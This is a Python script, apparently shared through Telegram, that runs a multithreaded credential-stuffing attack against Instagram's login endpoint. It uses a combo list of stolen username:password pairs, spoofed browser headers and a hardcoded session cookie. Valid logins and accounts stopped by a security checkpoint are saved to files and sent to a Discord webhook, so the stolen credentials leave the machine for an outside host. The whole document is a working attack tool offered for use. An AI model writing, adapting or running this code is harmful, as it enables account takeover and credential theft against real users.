#ig@lfillaz 
#2023
try:
    import sys, os, threading, time, requests, queue
    from user_agent import generate_user_agent
    from datetime import datetime
    from os import system
    import pyfiglet
    from art import text2art
except Exception as Wl:
    print("MISSING LIB, ", Wl)
    input()
    exit()

q = queue.Queue()
hits = 0
Error = 0
Secureaccounts = 0

url = "https://www.instagram.com/accounts/login/ajax/"

def send_attack(nusername, password, webhook_url):
    global hits, Error, Secureaccounts
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-length': '321',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'csrftoken=9uC0IZCNzChRNbCvqXi03BzUnvHQdNr5; mid=YoL7_gAEAAHVcHllgsPy5EzKIkG1; ig_did=1A60B050-D93A-48AA-9DF0-023F8DBD196B; ig_nrcb=1',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': generate_user_agent(),
        'x-asbd-id': '198387',
        'x-csrftoken': '9uC0IZCNzChRNbCvqXi03BzUnvHQdNr5',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '9bcc5b5208c5',
        'x-requested-with': 'XMLHttpRequest',
    }
    timee = int(datetime.now().timestamp())
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timee}:{password}',
        'username': nusername,
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'stopDeletionNonce': '',
        'trustedDeviceRecords': '{}',
    }
#by BY@BM_TE『𝐁𝐌』Telegram https://t.me/BM_TE
    r = requests.post(url, headers=headers, data=data)
    if 'oneTapPrompt":true' in r.text:
        open('hits.txt', 'a').write(f'nusername : {nusername}\npassword : {password}' + '\n\n')
        hits += 1
        send_to_webhook(webhook_url, f'[+] {nusername}:{password} - Account Found!')
#👁‍🗨
    elif '{"message":"checkpoint_required","checkpoint_url":"/challenge/action/' in r.text:
        open('Secure_accounts.txt', 'a').write(f'nusername : {nusername}\npassword : {password}' + '\n\n')
        Secureaccounts += 1
        send_to_webhook(webhook_url, f'[*] {nusername}:{password} - Account Requires Secure accounts!')

    elif 'user":true,"authenticated":false,"status":"ok' in r.text:
        Error += 1

    elif 'errors":{"error":["Sorry, there was a problem with your request."]},"status":"ok","error_type":"generic_request_error"}' in r.text:
        Error += 1

    elif '{"user":false,"authenticated":false,"status":"ok"}' in r.text:
        Error += 1

    elif '{"message":"To secure your account, we' in r.text:
        Error += 1

    elif '{"message":"Please wait a few minutes before you try again.","status":"fail"}' in r.text:
        Error += 1

    elif 'message":"","status":"fail"' in r.text:
        Error += 1

    elif '{"message":"Sorry, your password was' in r.text:
        Error += 1

    else:
        pass

    print(f'\r Error: [{Error}] | Hits: [{hits}] | Secure accounts: [{Secureaccounts}]', end='')

def send_to_webhook(webhook_url, message):
    data = {
        "content": message
    }
    try:
        requests.post(webhook_url, json=data)
    except:
        pass

def send():
    while True:
        try:
            i = q.get(timeout=2)
        except:
            break
        else:
            try:
                combo = i.split(':')
                nusername = combo[0]
                password = combo[1]
            except:
                pass
            else:
                send_attack(nusername, password, webhook_url)
                q.task_done()
#i see u do not edit it 🛑🛑💢
ascii_art = """
██╗███╗   ██╗███████╗████████╗ █████╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║██╔██╗ ██║███████╗   ██║   ███████║    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║██║╚██╗██║╚════██║   ██║   ██╔══██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║██║ ╚████║███████║   ██║   ██║  ██║    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
BY@lfillaz Telegram https://t.me/BM_TE
"""
print(ascii_art)

try:
    combo_file = input("Enter combo list file name: ")
    with open(combo_file, 'r') as reader:
        file_combo = reader.read().splitlines()
except Exception as Aw:
    print(Aw)
    input()
    sys.exit()

combo_list = []
for i in file_combo:
    combo_list.append(i)

proxy_file = input("Enter proxy list file name: ")
try:
    with open(proxy_file, 'r') as reader:
        file_proxy = reader.read().splitlines()
    proxy_list = []
    for proxy in file_proxy:
        proxy_list.append(proxy)
except Exception as Aw:
    print(Aw)
    input()
    sys.exit()

webhook_url = input("Enter Discord webhook URL: ")

for combo in combo_list:
    q.put(combo)

try:
    threads = int(input('Threads: '))
    print('')
except Exception:
    print('')
    threads = 1

threads_name = []
for i in range(threads):
    t = threading.Thread(target=send)
    t.daemon = True
    threads_name.append(t)
    t.start()

for t in threads_name:
    t.join()
